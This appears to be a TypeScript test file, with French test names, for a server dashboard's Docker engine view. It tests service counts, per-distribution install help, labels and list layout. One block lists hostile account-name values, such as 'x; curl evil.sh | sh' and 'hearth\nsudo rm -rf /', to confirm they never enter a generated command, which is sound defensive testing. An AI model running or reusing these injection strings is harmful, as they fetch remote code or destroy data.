import { describe, expect, it } from "vitest";
import type { EngineInfo, ServiceState } from "@/link";
import { service } from "@/test/service";
import { categoryOf, countServices, shownCounts } from "./counts";
import {
  imageLabel,
  loopBand,
  PORTS_WIDTH,
  portLabel,
  rowLabel,
  shortAge,
  stateLine,
  visiblePortCount,
} from "./format";
import { familyOf, helpFor } from "./help";
import { anchoredScroll, indexAt, offsetsOf, windowOf } from "./layout";
import { type ServerServices, show } from "./view";

const NOW = Date.parse("2026-10-13T12:00:00Z");

function engine(
  patch: Partial<EngineInfo> = {},
  host: Partial<EngineInfo["host"]> = {},
): EngineInfo {
  return {
    state: "ready",
    name: "Docker Engine",
    version: "24.0.7",
    minVersion: "20.10",
    agentAccount: "hearth",
    agentIsAdmin: false,
    lastReadyAt: null,
    checkedAt: NOW,
    listReadAt: null,
    listDegraded: false,
    at: null,
    listCurrentAt: null,
    ...patch,
    host: { osId: "debian", osLike: [], init: "systemd", declarative: false, ...host },
  };
}

describe("compteurs de la carte du moteur (BR-ENGINE-004)", () => {
  const ALL: ServiceState[] = [
    "running",
    "stopped",
    "starting",
    "stopping",
    "error",
    "restart_loop",
    "paused",
    "deploying",
    "unknown",
  ];

  it("range chacun des neuf états dans UNE catégorie, comme la spec l'écrit", () => {
    expect(Object.fromEntries(ALL.map((state) => [state, categoryOf(state)]))).toEqual({
      running: "running",
      stopped: "stopped",
      starting: "transition",
      stopping: "transition",
      error: "error",
      restart_loop: "error",
      paused: "other",
      deploying: "transition",
      unknown: "other",
    });
  });

  it("le total des catégories égale le nombre de services, créés hors de Hearth compris", () => {
    const services = ALL.flatMap((state, index) => [
      service({ key: `a${index}`, state, origin: "hearth" }),
      service({ key: `b${index}`, state, origin: "external" }),
    ]);
    const counts = countServices(services);
    expect(Object.values(counts).reduce((sum, n) => sum + n, 0)).toBe(services.length);
    expect(counts).toEqual({ running: 2, stopped: 2, error: 4, transition: 6, other: 4 });
  });

  it("n'affiche « en transition » et « autres » que s'ils ne sont pas vides", () => {
    expect(shownCounts(countServices([]))).toEqual([
      { key: "running", n: 0 },
      { key: "stopped", n: 0 },
      { key: "error", n: 0 },
    ]);
    const keys = shownCounts(
      countServices([
        service({ key: "a", state: "starting" }),
        service({ key: "b", state: "paused" }),
      ]),
    ).map((item) => item.key);
    expect(keys).toEqual(["running", "stopped", "error", "transition", "other"]);
  });
});

describe("aide par distribution (BR-ENGINE-005, 007, 008, 017)", () => {
  it("reconnaît la famille d'après os_id et os_like, et NixOS d'après le serveur déclaratif", () => {
    const family = (osId: string, osLike: string[] = [], declarative = false) =>
      familyOf({ osId, osLike, init: "systemd", declarative });
    expect(family("debian")).toBe("debian");
    expect(family("ubuntu", ["debian"])).toBe("debian");
    expect(family("fedora")).toBe("fedora");
    expect(family("rocky", ["rhel", "centos", "fedora"])).toBe("fedora");
    expect(family("arch")).toBe("arch");
    expect(family("manjaro", ["arch"])).toBe("arch");
    expect(family("nixos", [], true)).toBe("nixos");
    expect(family("nixos")).toBe("nixos");
    expect(family("autre", ["inconnue"])).toBeNull();
    expect(family("")).toBeNull();
  });

  it("NixOS : la ligne de configuration, jamais une commande", () => {
    const nixos = engine({}, { osId: "nixos", declarative: true });
    for (const kind of ["install", "start"] as const) {
      expect(helpFor(kind, nixos)).toMatchObject({
        kind: "config",
        text: "virtualisation.docker.enable = true;",
        config: true,
      });
    }
    const denied = helpFor(
      "access",
      engine({ agentAccount: "hearth" }, { osId: "nixos", declarative: true }),
    );
    expect(denied).toMatchObject({ kind: "config", config: true });
    expect(denied.kind === "config" && denied.text).not.toMatch(/sudo/);
  });

  it("Debian, Fedora et Arch : une commande d'installation propre à la famille", () => {
    const text = (osId: string, osLike: string[] = []) => {
      const help = helpFor("install", engine({}, { osId, osLike }));
      return help.kind === "command" ? help.text : "";
    };
    expect(text("debian")).toContain("apt-get install -y docker.io");
    expect(text("ubuntu", ["debian"])).toContain("apt-get");
    expect(text("fedora")).toContain("dnf install -y moby-engine");
    expect(text("arch")).toContain("pacman -S docker");
  });

  it("distribution inconnue : le renvoi à la documentation, aucune commande", () => {
    expect(helpFor("install", engine({}, { osId: "gentoo" }))).toEqual({ kind: "docs" });
    // Sans systemd, aucune commande `systemctl` n'est inventée.
    expect(helpFor("start", engine({}, { init: "other" }))).toEqual({ kind: "docs" });
    expect(helpFor("install", engine({}, { init: "other" }))).toEqual({ kind: "docs" });
  });

  it("démarrer et autoriser valent pour toute distribution ; le compte est celui de l'agent", () => {
    expect(helpFor("start", engine({}, { osId: "gentoo" }))).toMatchObject({
      kind: "command",
      text: "sudo systemctl enable --now docker",
    });
    expect(helpFor("access", engine({ agentAccount: "hearth" }))).toMatchObject({
      kind: "command",
      text: "sudo usermod -aG docker hearth",
    });
  });

  describe("le nom du compte venu de l'agent n'entre dans une commande qu'après validation (I2)", () => {
    const HOSTILE = [
      "x; curl evil.sh | sh",
      "hearth && reboot",
      "hearth user",
      "$(id)",
      "`id`",
      "hearth\nsudo rm -rf /",
      "hearth\r\n",
      "héarth",
      "ｈearth",
      "Hearth",
      "1hearth",
      "-hearth",
      "hearth$",
      "a".repeat(33),
      "",
      "../root",
      "he'arth",
      'he"arth',
      "hearth|id",
      "hearth>x",
    ];
    const blocks = (account: string) => [
      helpFor("access", engine({ agentAccount: account })),
      helpFor("access", engine({ agentAccount: account }, { osId: "nixos", declarative: true })),
    ];

    it("un nom hostile n'apparaît jamais dans un bloc de commande ni de configuration", () => {
      for (const account of HOSTILE) {
        for (const help of blocks(account)) {
          if (help.kind === "docs") throw new Error("une aide est attendue");
          if (account !== "") expect(help.text, JSON.stringify(account)).not.toContain(account);
          // L'emplacement littéral à remplir, et le dire.
          expect(help.text).toContain("<compte-de-l-agent>");
          expect(help.note).toContain("<compte-de-l-agent>");
          // Jamais de retour à la ligne dans une commande (une seconde commande cachée).
          if (help.kind === "command") expect(help.text).not.toMatch(/[\r\n]/);
        }
      }
    });

    it("un nom POSIX valide est repris tel quel, sans note", () => {
      for (const account of [
        "hearth",
        "_hearth",
        "hearth-agent",
        "svc_1",
        "pi",
        "a",
        "a".repeat(32),
      ]) {
        const [command, config] = blocks(account);
        expect(command).toMatchObject({
          kind: "command",
          text: `sudo usermod -aG docker ${account}`,
        });
        expect(config).toMatchObject({
          kind: "config",
          text: `users.users.${account}.extraGroups = [ "docker" ];`,
        });
        expect(command?.kind === "command" && command.note).toBeFalsy();
      }
    });

    it("le nom hostile n'entre dans aucune autre aide (installer, démarrer)", () => {
      for (const kind of ["install", "start"] as const) {
        for (const osId of ["debian", "fedora", "arch", "nixos"]) {
          const help = helpFor(
            kind,
            engine({ agentAccount: HOSTILE[0] }, { osId, declarative: osId === "nixos" }),
          );
          expect("text" in help ? help.text : "").not.toContain("curl");
        }
      }
    });

    it("la distribution se choisit dans une liste fermée : jamais une valeur reçue", () => {
      // Des noms qui existent sur tout objet JavaScript ne désignent aucune famille.
      for (const id of ["constructor", "__proto__", "toString", "hasOwnProperty", "valueOf"]) {
        expect(
          familyOf({ osId: id, osLike: [], init: "systemd", declarative: false }),
          id,
        ).toBeNull();
        expect(helpFor("install", engine({}, { osId: id }))).toEqual({ kind: "docs" });
      }
      // Une valeur hostile ne choisit rien et n'entre jamais dans la commande de la famille reconnue.
      const help = helpFor("install", engine({}, { osId: "x; reboot", osLike: ["debian"] }));
      expect(help).toMatchObject({ kind: "command" });
      expect("text" in help && help.text).not.toContain("reboot");
      expect(helpFor("install", engine({}, { osId: "debian; reboot" }))).toEqual({ kind: "docs" });
    });
  });

  it("aucun texte d'aide ne contient de variable d'environnement ni de secret", () => {
    const all = [
      helpFor("install", engine({}, { osId: "debian" })),
      helpFor("install", engine({}, { osId: "fedora" })),
      helpFor("install", engine({}, { osId: "arch" })),
      helpFor("start", engine()),
      helpFor("access", engine()),
      helpFor("start", engine({}, { osId: "nixos", declarative: true })),
    ]
      .map((help) => ("text" in help ? help.text : ""))
      .join("\n");
    expect(all).not.toMatch(/password|token|secret|key=|\$\{?[A-Z_]+/i);
  });
});

describe("textes d'une ligne (BR-SVC-002, 006, 022)", () => {
  it("âge court : la plus grande unité entière", () => {
    expect(shortAge(5_000)).toBe("5 s");
    expect(shortAge(12 * 60_000)).toBe("12 min");
    expect(shortAge(2 * 3_600_000 + 59 * 60_000)).toBe("2 h");
    expect(shortAge(3 * 86_400_000 + 1)).toBe("3 j");
    expect(shortAge(-5_000)).toBe("0 s");
  });

  it("image : nom et version, nom seul, ou l'identifiant court d'une image sans nom", () => {
    expect(imageLabel(service({ key: "a" }))).toBe("nginx:1.27");
    expect(
      imageLabel(service({ key: "a", image: { ref: "nginx", tag: null, shortId: "x" } })),
    ).toBe("nginx");
    expect(
      imageLabel(service({ key: "a", image: { ref: null, tag: null, shortId: "0123456789ab" } })),
    ).toBe("image sans nom 0123456789ab");
  });

  it("port : « 8080 vers 80 (TCP) »", () => {
    expect(portLabel({ hostPort: 8080, containerPort: 80, protocol: "tcp", scope: "all" })).toBe(
      "8080 vers 80 (TCP)",
    );
    expect(portLabel({ hostPort: 53, containerPort: 53, protocol: "udp", scope: "local" })).toBe(
      "53 vers 53 (UDP)",
    );
  });

  it("port d'un protocole inconnu : les deux ports, sans protocole inventé", () => {
    expect(
      portLabel({ hostPort: 4433, containerPort: 443, protocol: "unknown", scope: "unknown" }),
    ).toBe("4433 vers 443");
  });

  it("ports : trois au plus, et seulement ceux qui tiennent sur deux lignes avec « +N »", () => {
    const port = (n: number, protocol: "tcp" | "udp" = "tcp") => ({
      hostPort: n,
      containerPort: n,
      protocol,
      scope: "all" as const,
    });
    expect(visiblePortCount([])).toBe(0);
    expect(visiblePortCount([port(80), port(81), port(82)])).toBe(3);
    expect(visiblePortCount(Array.from({ length: 8 }, (_, i) => port(30000 + i)))).toBe(2);
    expect(visiblePortCount([port(65535), port(65534), port(65533), port(65532)])).toBe(2);
    // Mode compact (colonne de 220 px) : moins de puces tiennent que dans la colonne large de 270 px.
    expect(visiblePortCount([port(80), port(81), port(82)], PORTS_WIDTH.compact)).toBe(2);
    expect(visiblePortCount([port(80), port(81), port(82)], PORTS_WIDTH.wide)).toBe(3);
    // Des ports coupés par l'agent ajoutent la puce « +N », qui prend de la place.
    expect(visiblePortCount([port(80), port(81)], PORTS_WIDTH.compact, 0)).toBe(2);
    expect(visiblePortCount([port(80), port(81)], PORTS_WIDTH.compact, 9)).toBe(2);
  });

  it("seconde ligne de l'état", () => {
    const at = (ms: number) => NOW - ms;
    const day = 86_400_000;
    expect(
      stateLine(service({ key: "a", since: at(3 * day + 4 * 3_600_000 + 12 * 60_000) }), NOW),
    ).toBe("depuis 3 j 4 h 12 min");
    expect(stateLine(service({ key: "a", state: "stopped", since: at(2 * 3_600_000) }), NOW)).toBe(
      "Arrêté il y a 2 h",
    );
    expect(stateLine(service({ key: "a", state: "stopped", neverStarted: true }), NOW)).toBe(
      "Jamais démarré",
    );
    expect(
      stateLine(
        service({ key: "a", state: "error", since: at(2 * 3_600_000), exitCode: 137 }),
        NOW,
      ),
    ).toBe("il y a 2 h · code 137");
    expect(stateLine(service({ key: "a", state: "error", since: at(2 * 3_600_000) }), NOW)).toBe(
      "il y a 2 h",
    );
    expect(stateLine(service({ key: "a", state: "restart_loop", exitCode: 1 }), NOW)).toBe(
      "code 1",
    );
    expect(stateLine(service({ key: "a", state: "restart_loop" }), NOW)).toBe("");
    expect(stateLine(service({ key: "a", state: "paused" }), NOW)).toBe("");
  });

  it("bande « Redémarre en boucle », avec ou sans code de sortie", () => {
    expect(
      loopBand(service({ key: "a", state: "restart_loop", restarts10m: 4, exitCode: 137 })),
    ).toBe("A redémarré 4 fois en 10 min. Dernier code de sortie : 137");
    expect(loopBand(service({ key: "a", state: "restart_loop", restarts10m: 4 }))).toBe(
      "A redémarré 4 fois en 10 min.",
    );
    expect(loopBand(service({ key: "a" }))).toBe("");
  });

  it("nom accessible : nom, image, état, origine, ports", () => {
    expect(
      rowLabel(
        service({
          key: "a",
          name: "web",
          ports: [
            { hostPort: 1, containerPort: 1, protocol: "tcp", scope: "all" },
            { hostPort: 2, containerPort: 2, protocol: "tcp", scope: "all" },
          ],
        }),
      ),
    ).toBe(
      "web, nginx:1.27, En marche, Créé hors de Hearth, 2 ports : 1 vers 1 (TCP), 2 vers 2 (TCP)",
    );
    // Un service sur le réseau du serveur le dit, il n'a pas « aucun port » (I1).
    expect(rowLabel(service({ key: "a", name: "dns", origin: "hearth", hostNetwork: true }))).toBe(
      "dns, nginx:1.27, En marche, Utilise directement le réseau du serveur : aucun port individuel.",
    );
    expect(rowLabel(service({ key: "a", name: "db", origin: "hearth", state: "stopped" }))).toBe(
      "db, nginx:1.27, Arrêté",
    );
  });
});

describe("mise en page déduite des données (BR-SVC-015, 019)", () => {
  const heights = { row: 52, alert: 80 };
  const list = (states: ServiceState[]) => states.map((state) => ({ state }));

  it("les hauteurs viennent de l'état : la ligne en boucle est plus haute", () => {
    expect(offsetsOf(list(["running", "restart_loop", "stopped"]), heights)).toEqual([
      0, 52, 132, 184,
    ]);
    expect(offsetsOf([], heights)).toEqual([0]);
  });

  it("retrouve la ligne d'une position et ne dessine que la fenêtre visible, avec des voisines", () => {
    const many = list(Array.from({ length: 200 }, () => "running" as ServiceState));
    const offsets = offsetsOf(many, heights);
    expect(offsets.at(-1)).toBe(200 * 52);
    expect(indexAt(offsets, 0)).toBe(0);
    expect(indexAt(offsets, 52)).toBe(1);
    expect(indexAt(offsets, 51)).toBe(0);
    const window = windowOf(offsets, 52 * 100, 52 * 10, 8);
    expect(window.start).toBe(92);
    expect(window.end).toBeLessThan(125);
    expect(window.end - window.start).toBeLessThan(30);
    expect(windowOf(offsets, 0, 520, 8)).toEqual({ start: 0, end: 19 });
    expect(windowOf([0], 0, 500, 8)).toEqual({ start: 0, end: 0 });
  });

  it("la ligne repère reste en place quand une ligne au-dessus s'allonge, apparaît ou disparaît", () => {
    const keys = ["a", "b", "c", "d", "e"];
    const states = (loopAt: number | null) =>
      keys.map((_, index) => ({
        state: (index === loopAt ? "restart_loop" : "running") as ServiceState,
      }));
    const before = { keys, offsets: offsetsOf(states(null), heights) };
    // La ligne « c » est en haut de la zone visible, à 10 px de son bord haut.
    const scrollTop = 52 * 2 + 10;
    // « a » passe en boucle : +28 px au-dessus.
    const longer = { keys, offsets: offsetsOf(states(0), heights) };
    expect(anchoredScroll(before, longer, scrollTop)).toBe(132 + 10);
    // Une ligne apparaît tout en haut : tout descend de 52 px.
    const added = {
      keys: ["z", ...keys],
      offsets: offsetsOf(
        Array.from({ length: 6 }, () => ({ state: "running" as ServiceState })),
        heights,
      ),
    };
    expect(anchoredScroll(before, added, scrollTop)).toBe(scrollTop + 52);
    // Une ligne repère disparue : la position est gardée.
    const gone = {
      keys: ["a", "b", "d", "e"],
      offsets: offsetsOf(list(["running", "running", "running", "running"]), heights),
    };
    expect(anchoredScroll(before, gone, scrollTop)).toBe(scrollTop);
    // Tout en haut, rien ne bouge.
    expect(anchoredScroll(before, added, 0)).toBe(0);
  });
});

describe("ce qui s'affiche (BR-ENGINE-001, 019, BR-SVC-013, 018)", () => {
  function entry(patch: Partial<ServerServices> = {}): ServerServices {
    return {
      serverId: "forge",
      seq: 1,
      support: "supported",
      agentVersion: null,
      engine: engine(),
      services: [],
      previous: null,
      lastReady: null,
      receivedAt: NOW,
      engineReceivedAt: NOW,
      ...patch,
    };
  }
  const list = [service({ key: "a" }), service({ key: "b" })];

  it("agent sans heure (plus ancien) : la liste reste, datée par sa dernière lecture ; sans date, aucune inventée", () => {
    const readAt = NOW - 120_000;
    expect(
      show(entry({ engine: engine({ listDegraded: true, listReadAt: readAt }), services: list })),
    ).toMatchObject({ list: { kind: "live", degraded: { currentAt: readAt } } });
    expect(
      show(entry({ engine: engine({ listDegraded: true, listReadAt: null }), services: list })),
    ).toMatchObject({ list: { kind: "live", degraded: { currentAt: null } } });
    // Liste vide et dégradée : on ne dit pas « aucun service », la liste est inconnue.
    expect(show(entry({ engine: engine({ listDegraded: true }) }))).toMatchObject({
      list: { kind: "empty", degraded: { currentAt: null } },
    });
    // À jour : pas de marque.
    expect(show(entry({ services: list }))).toMatchObject({
      list: { kind: "live", degraded: null },
    });
  });

  describe("âge de la liste (HRT-72) : deux dates de l'agent, plus le temps écoulé chez ce poste", () => {
    const AT = Date.parse("2026-10-13T10:00:00Z");
    const view = (patch: Partial<EngineInfo>, receivedAt = NOW) =>
      show(
        entry({
          engine: engine({ listDegraded: true, at: AT, ...patch }),
          engineReceivedAt: receivedAt,
          services: list,
        }),
      );

    it("l'âge est at - listCurrentAt à la réception, sans comparer les horloges (l'agent est 3 h en avance)", () => {
      // L'horloge de l'agent (AT) n'a aucun rapport avec celle du poste (NOW) : seul l'écart entre ses deux dates compte.
      expect(view({ listCurrentAt: AT - 90_000 })).toMatchObject({
        list: { degraded: { currentAt: NOW - 90_000 } },
      });
    });

    it("un écart négatif est ramené à zéro", () => {
      expect(view({ listCurrentAt: AT + 5_000 })).toMatchObject({
        list: { degraded: { currentAt: NOW } },
      });
    });

    it("la date de réception décale l'âge : une vue reçue il y a 10 s a 10 s de plus", () => {
      expect(view({ listCurrentAt: AT - 90_000 }, NOW - 10_000)).toMatchObject({
        list: { degraded: { currentAt: NOW - 100_000 } },
      });
    });

    it("heure de l'agent présente, liste jamais lue : rien à dater", () => {
      expect(view({ listCurrentAt: null, listReadAt: NOW - 60_000 })).toMatchObject({
        list: { degraded: { currentAt: null } },
      });
    });

    it("moteur prêt, liste à jour : aucune marque, même avec les dates", () => {
      expect(
        show(
          entry({
            engine: engine({ at: AT, listCurrentAt: AT, listDegraded: false }),
            services: list,
          }),
        ),
      ).toMatchObject({ list: { degraded: null } });
    });
  });

  it("rien reçu, ou moteur en première détection : le chargement, aucune liste", () => {
    expect(show(undefined)).toEqual({ kind: "loading" });
    expect(show(entry({ engine: engine({ state: "checking" }), services: list }))).toEqual({
      kind: "loading",
    });
  });

  it("agent sans la capacité : le message, aucune liste", () => {
    expect(show(entry({ support: "unsupported", agentVersion: "0.1.0", engine: null }))).toEqual({
      kind: "old-agent",
      agentVersion: "0.1.0",
    });
  });

  it("moteur prêt : la liste en direct, ou l'état vide", () => {
    expect(show(entry({ services: list }))).toMatchObject({ list: { kind: "live" } });
    expect(show(entry())).toMatchObject({ list: { kind: "empty" } });
  });

  it("moteur arrêté : la liste que l'agent garde, grisée et datée de la dernière fois prêt", () => {
    const shown = show(
      entry({
        engine: engine({ state: "stopped" }),
        services: list,
        lastReady: { engineName: "Docker Engine", services: list, at: NOW - 40_000 },
      }),
    );
    expect(shown).toMatchObject({ list: { kind: "stale", since: NOW - 40_000 } });
  });

  describe("âge de la liste d'un moteur non prêt (I3, I4)", () => {
    const AT = Date.parse("2026-10-13T10:00:00Z");
    // L'agent a dit la liste à jour il y a 10 s (à SON horloge) quand il a publié « arrêté ».
    const stopped = (patch: Partial<EngineInfo> = {}) =>
      engine({ state: "stopped", at: AT, listCurrentAt: AT - 10_000, ...patch });

    it("part de list_current_at, pas du dernier événement : serveur calme, moteur arrêté depuis peu", () => {
      // Dernier lot prêt reçu il y a 3 h (serveur calme), vue « arrêté » reçue à l'instant.
      const lastReady = { engineName: "Docker Engine", services: list, at: NOW - 3 * 3_600_000 };
      expect(
        show(entry({ engine: stopped(), services: list, lastReady, engineReceivedAt: NOW })),
      ).toMatchObject({ list: { kind: "stale", since: NOW - 10_000 } });
    });

    it("le temps écoulé depuis la réception de la vue s'y ajoute (repère de la liaison)", () => {
      expect(
        show(entry({ engine: stopped(), services: list, engineReceivedAt: NOW - 60_000 })),
      ).toMatchObject({ list: { since: NOW - 70_000 } });
    });

    it("repère de réception inconnu (état relu d'un ancien fichier) : aucune date inventée", () => {
      expect(
        show(entry({ engine: stopped(), services: list, engineReceivedAt: null })),
      ).toMatchObject({ list: { kind: "stale", since: null } });
    });

    it("agent sans heure : la dernière fois que la liaison a vu le moteur prêt, sinon sa réception de la vue", () => {
      const lastReady = { engineName: "Docker Engine", services: list, at: NOW - 40_000 };
      expect(
        show(entry({ engine: engine({ state: "stopped" }), services: list, lastReady })),
      ).toMatchObject({ list: { since: NOW - 40_000 } });
      expect(
        show(
          entry({
            engine: engine({ state: "stopped", lastReadyAt: NOW - 999_000 }),
            services: list,
            engineReceivedAt: NOW - 5_000,
          }),
        ),
        // La date « dernière fois prêt » de l'agent n'est jamais comparée à l'horloge de ce poste.
      ).toMatchObject({ list: { since: NOW - 5_000 } });
    });
  });

  it("moteur non pris en charge : la dernière liste du MÊME moteur seulement", () => {
    const lastReady = { engineName: "Docker Engine", services: list, at: NOW - 1000 };
    expect(
      show(entry({ engine: engine({ state: "unsupported_version" }), lastReady })),
    ).toMatchObject({ list: { kind: "stale", services: list } });
    // Un autre moteur (Podman) : jamais la liste de Docker.
    expect(
      show(
        entry({
          engine: engine({ state: "unsupported_engine", name: "Podman Engine" }),
          lastReady,
        }),
      ),
    ).toMatchObject({ list: { kind: "none" } });
    // Absent ou désactivé : aucun moteur détecté, aucune liste ancienne.
    for (const state of ["absent", "disabled"] as const) {
      expect(show(entry({ engine: engine({ state, name: null }), lastReady }))).toMatchObject({
        list: { kind: "none" },
      });
    }
  });
});
